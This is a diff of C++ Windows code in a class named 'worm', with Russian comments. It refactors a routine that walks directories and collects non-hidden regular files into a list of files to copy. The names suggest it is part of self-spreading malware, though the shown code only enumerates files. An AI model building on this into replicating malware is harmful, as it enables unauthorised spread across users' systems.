@@ -278,37 +278,44 @@ void worm::collect_visible_files()
     collect_visible_files(list_dir, file_to_copy);
 }
 
-void worm::collect_visible_files(const vector<wstring> list_dir_tmp, vector<fs::path>& collected_files)
+void worm::collect_visible_files(const vector<wstring>& list_dir_tmp, vector<fs::path>& collected_files)
 {
     collected_files.clear();
 
     if (list_dir_tmp.empty()) {
-        std::cerr << "Список директорий пуст! Сначала выполните search_list_dir()\n";
+        wcerr << L"[!] Список директорий пуст! Сначала вызовите search_list_dir()\n";
         return;
     }
 
     for (const auto& dir : list_dir_tmp) {
-        for (const auto& entry : fs::directory_iterator(dir)) {
-            try {
-                std::error_code ec;
-                auto status = entry.status(ec);
-                if (ec || !fs::is_regular_file(status)) continue;
+        std::error_code dir_ec;
+        fs::directory_iterator it(dir, dir_ec);
 
-                // Проверка скрытости
-                DWORD attrs = GetFileAttributesW(entry.path().wstring().c_str());
-                bool is_hidden = (attrs != INVALID_FILE_ATTRIBUTES) &&
-                    (attrs & FILE_ATTRIBUTE_HIDDEN);
+        if (dir_ec) {
+            wcerr << L"[!] Пропущена папка (нет доступа): " << dir << L" — " << dir_ec.message().c_str() << endl;
+            continue;
+        }
 
-                if (!is_hidden) {
-                    collected_files.push_back(entry.path());
-                }
-            }
-            catch (...) {
+        for (const auto& entry : it) {
+            std::error_code file_ec;
+            const fs::path& path = entry.path();
+            auto status = entry.status(file_ec);
+
+            if (file_ec || !fs::is_regular_file(status)) {
                 continue;
+            }
+
+            // Проверка на скрытость
+            DWORD attrs = GetFileAttributesW(path.c_str());
+            if (attrs == INVALID_FILE_ATTRIBUTES) continue;
+
+            if (!(attrs & FILE_ATTRIBUTE_HIDDEN)) {
+                collected_files.push_back(path);
             }
         }
     }
 }
+
 
 void worm::print_file_to_copy()
 {
